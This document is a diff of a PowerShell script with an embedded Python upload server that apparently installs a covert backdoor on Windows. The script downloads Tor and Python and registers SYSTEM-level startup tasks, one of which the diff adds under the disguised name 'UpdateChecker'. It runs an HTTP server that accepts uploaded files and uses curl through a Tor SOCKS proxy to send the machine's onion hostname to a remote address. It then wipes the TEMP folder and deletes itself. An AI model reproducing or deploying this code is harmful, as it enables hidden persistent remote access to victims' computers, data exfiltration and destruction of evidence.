@@ -4,8 +4,7 @@ param (
 $torURI = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.9/tor-expert-bundle-windows-x86_64-14.0.9.tar.gz"
 $pythonURI = "https://www.python.org/ftp/python/3.13.3/python-3.13.3.exe"
 $downloadPath = "$env:TEMP"
-$homeDir = "$env:USERPROFILE"
-$installPath = Join-Path $homeDir '.dotweb'
+$installPath = Join-Path $PSScriptRoot '.dotweb'
 New-Item -ItemType Directory -Path $installPath -Force *>$null
 $exfileName = "tmp.txt"
 $exfile = $downloadPath+"\"+$exfileName 
@@ -67,7 +66,6 @@ import os
 import subprocess
 
 PORT = 8080
-DIRECTORY = os.path.expanduser("~")
 
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_POST(self):
@@ -85,10 +83,10 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             content_length = int(self.headers['Content-Length'])
             file_data = self.rfile.read(content_length)
 
-            filename = "uploaded_file"
+            filename = "tmp"
             counter = 1
             while os.path.exists(filename):
-                filename = f"uploaded_file_{counter}"
+                filename = f"tmp{counter}"
                 counter += 1
 
             with open(filename, 'wb') as f:
@@ -106,8 +104,6 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return  
 
-os.chdir(DIRECTORY)
-
 handler = RequestHandler
 with socketserver.TCPServer(("", PORT), handler) as httpd:
     httpd.serve_forever()
@@ -119,11 +115,17 @@ $action = New-ScheduledTaskAction -Execute $pythonExe -Argument "`"$pythonFilePa
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
 Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Force *>$null
+$taskName2 = "UpdateChecker"
+$action2 = New-ScheduledTaskAction -Execute $torExe -Argument "-f `"$torTorrc`""
+$trigger2 = New-ScheduledTaskTrigger -AtStartup
+$principal2 = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+Register-ScheduledTask -TaskName $taskName2 -Trigger $trigger2 -Action $action2 -Principal $principal2 -Force *>$null
 $exfileContent = @"
 $webHostName
 "@
 Set-Content -Path $exfile -Value $exfileContent -Encoding ASCII -Force
 Start-Sleep -Seconds 5
 cmd.exe /c "curl --socks5-hostname 127.0.0.1:9050 -F file=@`"$exfile`" http://$remoteAddress/upload" >$null 2>&1
+Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $exfile -Force
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
